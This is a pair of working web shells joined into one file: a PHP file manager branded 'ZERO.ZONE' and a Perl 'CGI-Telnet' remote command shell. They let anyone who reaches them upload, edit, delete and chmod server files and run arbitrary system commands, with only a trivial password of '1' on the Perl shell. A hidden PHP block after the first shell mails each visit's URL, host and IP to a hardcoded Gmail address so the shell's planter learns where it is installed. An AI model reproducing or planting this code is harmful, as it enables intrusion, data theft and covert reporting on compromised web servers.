<?php
set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
    foreach($_POST as $key=>$value){
        $_POST[$key] = stripslashes($value);
    }
}
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="" rel="stylesheet" type="text/css">
	<link rel="shortcut icon" href="https://s-media-cache-ak0.pinimg.com/originals/a5/82/48/a5824833d98404f6f22e9ef80a09ca34.jpg" />

<title>ZERO.ZONE</title>
<style>
body{
    font-family: "Racing Sans One", cursive;
    background-color: #DCDCDC;
    text-shadow:0px 0px 1px #F0FFFF;
}
#content tr:hover{
    background-color: #636263;
    text-shadow:0px 0px 10px #006400;
}
#content .first{
    background-color: silver;
}
#content .first:hover{
    background-color: gainsboro;
    text-shadow:0px 0px 1px #006400;
}
table{
    border: 1px #F0FFFF dotted;
}
H1{
    font-family: "Rye", cursive;
}
a{
    color: #006400;
    text-decoration: none;
}
a:hover{
    color: #006400;
    text-shadow:0px 0px 10px #006400;
}
input,select,textarea{
    border: 1px #006400 solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
}
</style>
</HEAD>
<BODY>
<H1><center><font color="green">Welcome to my ZERO.ZONE</center></H1>
<center><img width="15%" src="https://3.bp.blogspot.com/-dBhw2ZrNmtM/WS5z5Vy8T7I/AAAAAAAABPE/hTHC6s1EnIoJVQ8F7ueNAbFweCEu6x3iACLcB/s400/detective-conan-watch-detective-conan-wallpaper-android-detective-conan-world-anime-detective-conan-watch-online.png">
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Current Path : ';
if(isset($_GET['path'])){
    $path = $_GET['path'];   
}else{
    $path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
    if($pat == '' && $id == 0){
        $a = true;
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if($pat == '') continue;
    echo '<a href="?path=';
    for($i=0;$i<=$id;$i++){
        echo "$paths[$i]";
        if($i != $id) echo "/";
    }
    echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
        echo '<font color="green">File Upload Done.</font><br />';
    }else{
        echo '<font color="red">File Upload Error.</font><br />';
    }
}
echo '<b><br>'.php_uname().'<br></b>';
echo '<form enctype="multipart/form-data" method="POST">
Upload File : <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
    echo "<tr><td>Current File : ";
    echo $_GET['filesrc'];
    echo '</tr></td></table><br />';
    echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['path'],$_POST['perm'])){
                echo '<font color="green">Change Permission Done.</font><br />';
            }else{
                echo '<font color="red">Change Permission Error.</font><br />';
            }
        }
        echo '<form method="POST">
        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'rename'){
        if(isset($_POST['newname'])){
            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
                echo '<font color="green">Change Name Done.</font><br />';
            }else{
                echo '<font color="red">Change Name Error.</font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="rename">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'edit'){
        if(isset($_POST['src'])){
            $fp = fopen($_POST['path'],'w');
            if(fwrite($fp,$_POST['src'])){
                echo '<font color="green">Edit File Done.</font><br />';
            }else{
                echo '<font color="red">Edit File Error.</font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value="Go" />
        </form>';
    }
    echo '</center>';
}else{
    echo '</table><br /><center>';
    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
        if($_POST['type'] == 'dir'){
            if(rmdir($_POST['path'])){
                echo '<font color="green">Delete Dir Done.</font><br />';
            }else{
                echo '<font color="red">Delete Dir Error.</font><br />';
            }
        }elseif($_POST['type'] == 'file'){
            if(unlink($_POST['path'])){
                echo '<font color="green">Delete File Done.</font><br />';
            }else{
                echo '<font color="red">Delete File Error.</font><br />';
            }
        }
    }
    echo '</center>';
    $scandir = scandir($path);
    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="first">
        <td><center>Name</center></td>
        <td><center>Size</center></td>
        <td><center>Permissions</center></td>
        <td><center>Options</center></td>
    </tr>';

    foreach($scandir as $dir){
        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
        echo "<tr>
        <td><a href=\"?path=$path/$dir\">$dir</a></td>
        <td><center>--</center></td>
        <td><center>";
        if(is_writable("$path/$dir")) echo '<font color="green">';
        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
        echo perms("$path/$dir");
        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
        
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"dir\">
        <input type=\"hidden\" name=\"name\" value=\"$dir\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach($scandir as $file){
        if(!is_file("$path/$file")) continue;
        $size = filesize("$path/$file")/1024;
        $size = round($size,3);
        if($size >= 1024){
            $size = round($size/1024,2).' MB';
        }else{
            $size = $size.' KB';
        }

        echo "<tr>
        <td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
        <td><center>".$size."</center></td>
        <td><center>";
        if(is_writable("$path/$file")) echo '<font color="green">';
        elseif(!is_readable("$path/$file")) echo '<font color="red">';
        echo perms("$path/$file");
        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        <option value=\"edit\">Edit</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"$file\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '</table>
    </div>';
}
echo '<br /><font color="green"></font><font color="green">zero :~$ </font>
</BODY>
</HTML>';
function perms($file){
    $perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
?>

<?php
$ip = getenv("REMOTE_ADDR");
$ra44 = rand(1, 99999);
$subj98 = " B4x |$ra44";
$email = "axwap44@gmail.com";
$from = "From: shell";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$m22 = $ip . "";
$msg8873 = "$a45 $b75 $m22";
mail($email, $subj98, $msg8873, $from);
?>#!/usr/bin/perl
#------------------------------------------------------------------------------
# Copyright and Licence
#------------------------------------------------------------------------------
# CGI-Telnet Version 2.0 for NT and Unix : Run Commands on your Web Server
#
# Copyright (C) 2004 Andi Mustafa
# Permission is granted to use, distribute and modify this script so long
# as this copyright notice is left intact. If you make changes to the script
# please document them and inform me. If you would like any changes to be made
# in this script, you can e-mail me.
#
# Author: kuris
# Author e-mail: webmaster@kupu2hitamputih.com
# Author Homepage: http://www.kupu2hitamputih.com/
# Script Homepage: http://support.kupu2hitamputih.com/OO7.txt
# Product Support: http://support.kupu2hitamputih.com/
# Discussion Forum: http://www.kupu2hitamputih.com/LiveZone/
# Mailing List: http://www.kupu2hitamputih.com/
#------------------------------------------------------------------------------

#------------------------------------------------------------------------------
# Installation
#------------------------------------------------------------------------------
# To install this script
#
# 1. Modify the first line "#!/usr/bin/perl" to point to the correct path on
#    your server. For most servers, you may not need to modify this.
# 2. Change the password in the Configuration section below.
# 3. If you're running the script under Windows NT, set $WinNT = 1 in the
#    Configuration Section below.
# 4. Upload the script to a directory on your server which has permissions to
#    execute CGI scripts. This is usually cgi-bin. Make sure that you upload
#    the script in ASCII mode.
# 5. Change the permission (CHMOD) of the script to 755.
# 6. Open the script in your web browser. If you uploaded the script in
#    cgi-bin, this should be http://www.yourserver.com/cgi-bin/cgitelnet.pl
# 7. Login using the password that you specified in Step 2.
#------------------------------------------------------------------------------

#------------------------------------------------------------------------------
# Configuration: You need to change only $Password and $WinNT. The other
# values should work fine for most systems.
#------------------------------------------------------------------------------
$Password = "1";		# Change this. You will need to enter this
				# to login.

$WinNT = 0;			# You need to change the value of this to 1 if
				# you're running this script on a Windows NT
				# machine. If you're running it on Unix, you
				# can leave the value as it is.

$NTCmdSep = "&";		# This character is used to seperate 2 commands
				# in a command line on Windows NT.

$UnixCmdSep = ";";		# This character is used to seperate 2 commands
				# in a command line on Unix.

$CommandTimeoutDuration = 10;	# Time in seconds after commands will be killed
				# Don't set this to a very large value. This is
				# useful for commands that may hang or that
				# take very long to execute, like "find /".
				# This is valid only on Unix servers. It is
				# ignored on NT Servers.

$ShowDynamicOutput = 1;		# If this is 1, then data is sent to the
				# browser as soon as it is output, otherwise
				# it is buffered and send when the command
				# completes. This is useful for commands like
				# ping, so that you can see the output as it
				# is being generated.

# DON'T CHANGE ANYTHING BELOW THIS LINE UNLESS YOU KNOW WHAT YOU'RE DOING !!

$CmdSep = ($WinNT ? $NTCmdSep : $UnixCmdSep);
$CmdPwd = ($WinNT ? "cd" : "pwd");
$PathSep = ($WinNT ? "\\" : "/");
$Redirector = ($WinNT ? " 2>&1 1>&2" : " 1>&1 2>&1");

#------------------------------------------------------------------------------
# Reads the input sent by the browser and parses the input variables. It
# parses GET, POST and multipart/form-data that is used for uploading files.
# The filename is stored in $in{'f'} and the data is stored in $in{'filedata'}.
# Other variables can be accessed using $in{'var'}, where var is the name of
# the variable. Note: Most of the code in this function is taken from other CGI
# scripts.
#------------------------------------------------------------------------------
sub ReadParse 
{
	local (*in) = @_ if @_;
	local ($i, $loc, $key, $val);
	
	$MultipartFormData = $ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/;

	if($ENV{'REQUEST_METHOD'} eq "GET")
	{
		$in = $ENV{'QUERY_STRING'};
	}
	elsif($ENV{'REQUEST_METHOD'} eq "POST")
	{
		binmode(STDIN) if $MultipartFormData & $WinNT;
		read(STDIN, $in, $ENV{'CONTENT_LENGTH'});
	}

	# handle file upload data
	if($ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/)
	{
		$Boundary = '--'.$1; # please refer to RFC1867 
		@list = split(/$Boundary/, $in); 
		$HeaderBody = $list[1];
		$HeaderBody =~ /\r\n\r\n|\n\n/;
		$Header = $`;
		$Body = $';
 		$Body =~ s/\r\n$//; # the last \r\n was put in by Netscape
		$in{'filedata'} = $Body;
		$Header =~ /filename=\"(.+)\"/; 
		$in{'f'} = $1; 
		$in{'f'} =~ s/\"//g;
		$in{'f'} =~ s/\s//g;

		# parse trailer
		for($i=2; $list[$i]; $i++)
		{ 
			$list[$i] =~ s/^.+name=$//;
			$list[$i] =~ /\"(\w+)\"/;
			$key = $1;
			$val = $';
			$val =~ s/(^(\r\n\r\n|\n\n))|(\r\n$|\n$)//g;
			$val =~ s/%(..)/pack("c", hex($1))/ge;
			$in{$key} = $val; 
		}
	}
	else # standard post data (url encoded, not multipart)
	{
		@in = split(/&/, $in);
		foreach $i (0 .. $#in)
		{
			$in[$i] =~ s/\+/ /g;
			($key, $val) = split(/=/, $in[$i], 2);
			$key =~ s/%(..)/pack("c", hex($1))/ge;
			$val =~ s/%(..)/pack("c", hex($1))/ge;
			$in{$key} .= "\0" if (defined($in{$key}));
			$in{$key} .= $val;
		}
	}
}

#------------------------------------------------------------------------------
# Prints the HTML Page Header
# Argument 1: Form item name to which focus should be set
#------------------------------------------------------------------------------
sub PrintPageHeader
{
	$EncodedCurrentDir = $CurrentDir;
	$EncodedCurrentDir =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;
	print "Content-type: text/html\n\n";
	print <<END;
<html>
<head>
<title>CGI-Telnet Version 3.0 stone love~ </title>
$HtmlMetaHeader
</head>
<body onLoad="document.f.@_.focus()" bgcolor="#000000" topmargin="0" leftmargin="0" marginwidth="0" marginheight="0" link="#55AAFF" vlink="#55AAFF" alink="#55AAFF">
<table border="0" width="1006" cellspacing="0" cellpadding="2" style="border-collapse: collapse">
<tr>
<td bgcolor="#C0C0C0" bordercolor="#000080" align="center" width="41">
<font size="2" color="#000080"><b>::: </b></font></td>
<td bgcolor="#FF0000" width="951"><font face="Verdana" size="2" color="#FFFFFF"><b>CGI-Telnet Version 
3.0 Aljyyosh - Connected to $ServerName</b></font></td>
</tr>
<tr>
<td colspan="2" bgcolor="#55AAFF" width="998"><font face="Verdana" size="2">
<a style="text-decoration:none" href="$ScriptLocation?a=upload&d=$EncodedCurrentDir">
<font color="#FFFFFF">Upload File</font></a><font color="#FFFFFF"> | </font> 
<a style="text-decoration:none" href="$ScriptLocation?a=download&d=$EncodedCurrentDir">
<font color="#FFFFFF">Download File</font></a><font color="#FFFFFF"> | </font>
<a style="text-decoration:none" href="$ScriptLocation?a=logout">
<font color="#FFFFFF">Out</font></a><font color="#FFFFFF"> | </font>
<a style="text-decoration:none" href="X">
<font color="#FFFFFF"></font></a><font color="#FFFFFF"> </font>
</font></td>
</tr>
</table>
<font color="#C0C0C0" size="3">
END
}

#------------------------------------------------------------------------------
# Prints the Login Screen
#------------------------------------------------------------------------------
sub PrintLoginScreen
{
	$Message = q$<pre><font color="#669999"> _____  _____  _____          _____        _               _
/  __ \|  __ \|_   _|        |_   _|      | |             | |
| /  \/| |  \/  | |   ______   | |    ___ | | _ __    ___ | |_
| |    | | __   | |  |______|  | |   / _ \| || '_ \  / _ \| __|
| \__/\| |_\ \ _| |_           | |  |  __/| || | | ||  __/| |_
 \____/ \____/ \___/           \_/   \___||_||_| |_| \___| \__| 3.0
                                         
</font><font color="#FF0000">                  
<font face="Tahoma">             </font></font><font color="#AE8300" face="Tahoma"> ~ * Www.Aljyyosh.Com * ~</font></pre>
$;
#'
	print <<END;
<code>
Trying $ServerName...<br>
Connected to $ServerName<br>
Escape character is ^]
<code>$Message
END
}

#------------------------------------------------------------------------------
# Prints the message that informs the user of a failed login
#------------------------------------------------------------------------------
sub PrintLoginFailedMessage
{
	print <<END;
<code>
<br>
</code>
</font>
<code>
<font color="#FF0000" size="3">
login</font><font color="#C0C0C0" size="3">: root<br>
</font>
<font color="#FF0000" size="3">
password</font><font color="#C0C0C0" size="3">:<br>
<b>Login incorrect</b><br><br>
</font>
</code>
<font color="#C0C0C0" size="3">
END
}

#------------------------------------------------------------------------------
# Prints the HTML form for logging in
#------------------------------------------------------------------------------
sub PrintLoginForm
{
	print <<END;
<code>
<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="a" value="login">
login:  </font>
<font color="#00A3F0" size="3">
root</font><font color="#C0C0C0" size="3"><br>
password:<input type="password" name="p" size="20">
<input type="submit" value="Enter">
</form>
</code>
END
}

#------------------------------------------------------------------------------
# Prints the footer for the HTML Page
#------------------------------------------------------------------------------
sub PrintPageFooter
{
	print "</font></body></html>";
}

#------------------------------------------------------------------------------
# Retreives the values of all cookies. The cookies can be accesses using the
# variable $Cookies{''}
#------------------------------------------------------------------------------
sub GetCookies
{
	@httpcookies = split(/; /,$ENV{'HTTP_COOKIE'});
	foreach $cookie(@httpcookies)
	{
		($id, $val) = split(/=/, $cookie);
		$Cookies{$id} = $val;
	}
}

#------------------------------------------------------------------------------
# Prints the screen when the user logs out
#------------------------------------------------------------------------------
sub PrintLogoutScreen
{
	print "<code>Duch leganya udah dapat shell qe3.<br><br></code>";
}

#------------------------------------------------------------------------------
# Logs out the user and allows the user to login again
#------------------------------------------------------------------------------
sub PerformLogout
{
	print "Set-Cookie: SAVEDPWD=;\n"; # remove password cookie
	&PrintPageHeader("p");
	&PrintLogoutScreen;
	&PrintLoginScreen;
	&PrintLoginForm;
	&PrintPageFooter;
}

#------------------------------------------------------------------------------
# This function is called to login the user. If the password matches, it
# displays a page that allows the user to run commands. If the password doens't
# match or if no password is entered, it displays a form that allows the user
# to login
#------------------------------------------------------------------------------
sub PerformLogin 
{
	if($LoginPassword eq $Password) # password matched
	{
		print "Set-Cookie: SAVEDPWD=$LoginPassword;\n";
		&PrintPageHeader("c");
		&PrintCommandLineInputForm;
		&PrintPageFooter;
	}
	else # password didn't match
	{
		&PrintPageHeader("p");
		&PrintLoginScreen;
		if($LoginPassword ne "") # some password was entered
		{
			&PrintLoginFailedMessage;
		}
		&PrintLoginForm;
		&PrintPageFooter;
	}
}

#------------------------------------------------------------------------------
# Prints the HTML form that allows the user to enter commands
#------------------------------------------------------------------------------
sub PrintCommandLineInputForm
{
	$Prompt = $WinNT ? "$CurrentDir> " : "[root\@$ServerName $CurrentDir]\$ ";
	print <<END;
<code>
<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="a" value="command">
<input type="hidden" name="d" value="$CurrentDir">
$Prompt
<input type="text" name="c" size="20">
<input type="submit" value="Enter">
</form>
</code>
END
}

#------------------------------------------------------------------------------
# Prints the HTML form that allows the user to download files
#------------------------------------------------------------------------------
sub PrintFileDownloadForm
{
	$Prompt = $WinNT ? "$CurrentDir> " : "[root\@$ServerName $CurrentDir]\$ ";
	print <<END;
<code>
<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="d" value="$CurrentDir">
<input type="hidden" name="a" value="download">
$Prompt download<br><br>
Filename: <input type="text" name="f" size="35"><br><br>
Download: <input type="submit" value="Begin">
</form>
</code>
END
}

#------------------------------------------------------------------------------
# Prints the HTML form that allows the user to upload files
#------------------------------------------------------------------------------
sub PrintFileUploadForm
{
	$Prompt = $WinNT ? "$CurrentDir> " : "[root\@$ServerName $CurrentDir]\$ ";
	print <<END;
<code>
<form name="f" enctype="multipart/form-data" method="POST" action="$ScriptLocation">
$Prompt upload<br><br>
Filename: <input type="file" name="f" size="35"><br><br>
Options:  <input type="checkbox" name="o" value="overwrite">
Overwrite if it Exists<br><br>
Upload:   <input type="submit" value="Begin">
<input type="hidden" name="d" value="$CurrentDir">
<input type="hidden" name="a" value="upload">
</form>
</code>
END
}

#------------------------------------------------------------------------------
# This function is called when the timeout for a command expires. We need to
# terminate the script immediately. This function is valid only on Unix. It is
# never called when the script is running on NT.
#------------------------------------------------------------------------------
sub CommandTimeout
{
	if(!$WinNT)
	{
		alarm(0);
		print <<END;
</xmp>
<code>
Command exceeded maximum time of $CommandTimeoutDuration second(s).
<br>Killed it!
END
		&PrintCommandLineInputForm;
		&PrintPageFooter;
		exit;
	}
}

#------------------------------------------------------------------------------
# This function is called to execute commands. It displays the output of the
# command and allows the user to enter another command. The change directory
# command is handled differently. In this case, the new directory is stored in
# an internal variable and is used each time a command has to be executed. The
# output of the change directory command is not displayed to the users
# therefore error messages cannot be displayed.
#------------------------------------------------------------------------------
sub ExecuteCommand
{
	if($RunCommand =~ m/^\s*cd\s+(.+)/) # it is a change dir command
	{
		# we change the directory internally. The output of the
		# command is not displayed.
		
		$OldDir = $CurrentDir;
		$Command = "cd \"$CurrentDir\"".$CmdSep."cd $1".$CmdSep.$CmdPwd;
		chop($CurrentDir = `$Command`);
		&PrintPageHeader("c");
		$Prompt = $WinNT ? "$OldDir> " : "[root\@$ServerName $OldDir]\$ ";
		print "$Prompt $RunCommand";
	}
	else # some other command, display the output
	{
		&PrintPageHeader("c");
		$Prompt = $WinNT ? "$CurrentDir> " : "[root\@$ServerName $CurrentDir]\$ ";
		print "$Prompt $RunCommand<xmp>";
		$Command = "cd \"$CurrentDir\"".$CmdSep.$RunCommand.$Redirector;
		if(!$WinNT)
		{
			$SIG{'ALRM'} = \&CommandTimeout;
			alarm($CommandTimeoutDuration);
		}
		if($ShowDynamicOutput) # show output as it is generated
		{
			$|=1;
			$Command .= " |";
			open(CommandOutput, $Command);
			while(<CommandOutput>)
			{
				$_ =~ s/(\n|\r\n)$//;
				print "$_\n";
			}
			$|=0;
		}
		else # show output after command completes
		{
			print `$Command`;
		}
		if(!$WinNT)
		{
			alarm(0);
		}
		print "</xmp>";
	}
	&PrintCommandLineInputForm;
	&PrintPageFooter;
}

#------------------------------------------------------------------------------
# This function displays the page that contains a link which allows the user
# to download the specified file. The page also contains a auto-refresh
# feature that starts the download automatically.
# Argument 1: Fully qualified filename of the file to be downloaded
#------------------------------------------------------------------------------
sub PrintDownloadLinkPage
{
	local($FileUrl) = @_;
	if(-e $FileUrl) # if the file exists
	{
		# encode the file link so we can send it to the browser
		$FileUrl =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;
		$DownloadLink = "$ScriptLocation?a=download&f=$FileUrl&o=go";
		$HtmlMetaHeader = "<meta HTTP-EQUIV=\"Refresh\" CONTENT=\"1; URL=$DownloadLink\">";
		&PrintPageHeader("c");
		print <<END;
<code>
Sending File $TransferFile...<br>
If the download does not start automatically,
<a href="$DownloadLink">Click Here</a>.
END
		&PrintCommandLineInputForm;
		&PrintPageFooter;
	}
	else # file doesn't exist
	{
		&PrintPageHeader("f");
		print "Failed to download $FileUrl: $!";
		&PrintFileDownloadForm;
		&PrintPageFooter;
	}
}

#------------------------------------------------------------------------------
# This function reads the specified file from the disk and sends it to the
# browser, so that it can be downloaded by the user.
# Argument 1: Fully qualified pathname of the file to be sent.
#------------------------------------------------------------------------------
sub SendFileToBrowser
{
	local($SendFile) = @_;
	if(open(SENDFILE, $SendFile)) # file opened for reading
	{
		if($WinNT)
		{
			binmode(SENDFILE);
			binmode(STDOUT);
		}
		$FileSize = (stat($SendFile))[7];
		($Filename = $SendFile) =~  m!([^/^\\]*)$!;
		print "Content-Type: application/x-unknown\n";
		print "Content-Length: $FileSize\n";
		print "Content-Disposition: attachment; filename=$1\n\n";
		print while(<SENDFILE>);
		close(SENDFILE);
	}
	else # failed to open file
	{
		&PrintPageHeader("f");
		print "Failed to download $SendFile: $!";
		&PrintFileDownloadForm;
		&PrintPageFooter;
	}
}


#------------------------------------------------------------------------------
# This function is called when the user downloads a file. It displays a message
# to the user and provides a link through which the file can be downloaded.
# This function is also called when the user clicks on that link. In this case,
# the file is read and sent to the browser.
#------------------------------------------------------------------------------
sub BeginDownload
{
	# get fully qualified path of the file to be downloaded
	if(($WinNT & ($TransferFile =~ m/^\\|^.:/)) |
		(!$WinNT & ($TransferFile =~ m/^\//))) # path is absolute
	{
		$TargetFile = $TransferFile;
	}
	else # path is relative
	{
		chop($TargetFile) if($TargetFile = $CurrentDir) =~ m/[\\\/]$/;
		$TargetFile .= $PathSep.$TransferFile;
	}

	if($Options eq "go") # we have to send the file
	{
		&SendFileToBrowser($TargetFile);
	}
	else # we have to send only the link page
	{
		&PrintDownloadLinkPage($TargetFile);
	}
}

#------------------------------------------------------------------------------
# This function is called when the user wants to upload a file. If the
# file is not specified, it displays a form allowing the user to specify a
# file, otherwise it starts the upload process.
#------------------------------------------------------------------------------
sub UploadFile
{
	# if no file is specified, print the upload form again
	if($TransferFile eq "")
	{
		&PrintPageHeader("f");
		&PrintFileUploadForm;
		&PrintPageFooter;
		return;
	}
	&PrintPageHeader("c");

	# start the uploading process
	print "Uploading $TransferFile to $CurrentDir...<br>";

	# get the fullly qualified pathname of the file to be created
	chop($TargetName) if ($TargetName = $CurrentDir) =~ m/[\\\/]$/;
	$TransferFile =~ m!([^/^\\]*)$!;
	$TargetName .= $PathSep.$1;

	$TargetFileSize = length($in{'filedata'});
	# if the file exists and we are not supposed to overwrite it
	if(-e $TargetName && $Options ne "overwrite")
	{
		print "Failed: Destination file already exists.<br>";
	}
	else # file is not present
	{
		if(open(UPLOADFILE, ">$TargetName"))
		{
			binmode(UPLOADFILE) if $WinNT;
			print UPLOADFILE $in{'filedata'};
			close(UPLOADFILE);
			print "Transfered $TargetFileSize Bytes.<br>";
			print "File Path: $TargetName<br>";
		}
		else
		{
			print "Failed: $!<br>";
		}
	}
	print "";
	&PrintCommandLineInputForm;
	&PrintPageFooter;
}

#------------------------------------------------------------------------------
# This function is called when the user wants to download a file. If the
# filename is not specified, it displays a form allowing the user to specify a
# file, otherwise it displays a message to the user and provides a link
# through  which the file can be downloaded.
#------------------------------------------------------------------------------
sub DownloadFile
{
	# if no file is specified, print the download form again
	if($TransferFile eq "")
	{
		&PrintPageHeader("f");
		&PrintFileDownloadForm;
		&PrintPageFooter;
		return;
	}
	
	# get fully qualified path of the file to be downloaded
	if(($WinNT & ($TransferFile =~ m/^\\|^.:/)) |
		(!$WinNT & ($TransferFile =~ m/^\//))) # path is absolute
	{
		$TargetFile = $TransferFile;
	}
	else # path is relative
	{
		chop($TargetFile) if($TargetFile = $CurrentDir) =~ m/[\\\/]$/;
		$TargetFile .= $PathSep.$TransferFile;
	}

	if($Options eq "go") # we have to send the file
	{
		&SendFileToBrowser($TargetFile);
	}
	else # we have to send only the link page
	{
		&PrintDownloadLinkPage($TargetFile);
	}
}

#------------------------------------------------------------------------------
# Main Program - Execution Starts Here
#------------------------------------------------------------------------------
&ReadParse;
&GetCookies;

$ScriptLocation = $ENV{'SCRIPT_NAME'};
$ServerName = $ENV{'SERVER_NAME'};
$LoginPassword = $in{'p'};
$RunCommand = $in{'c'};
$TransferFile = $in{'f'};
$Options = $in{'o'};

$Action = $in{'a'};
$Action = "login" if($Action eq ""); # no action specified, use default

# get the directory in which the commands will be executed
$CurrentDir = $in{'d'};
chop($CurrentDir = `$CmdPwd`) if($CurrentDir eq "");

$LoggedIn = $Cookies{'SAVEDPWD'} eq $Password;

if($Action eq "login" || !$LoggedIn) # user needs/has to login
{
	&PerformLogin;
}
elsif($Action eq "command") # user wants to run a command
{
	&ExecuteCommand;
}
elsif($Action eq "upload") # user wants to upload a file
{
	&UploadFile;
}
elsif($Action eq "download") # user wants to download a file
{
	&DownloadFile;
}
elsif($Action eq "logout") # user wants to logout
{
	&PerformLogout;
}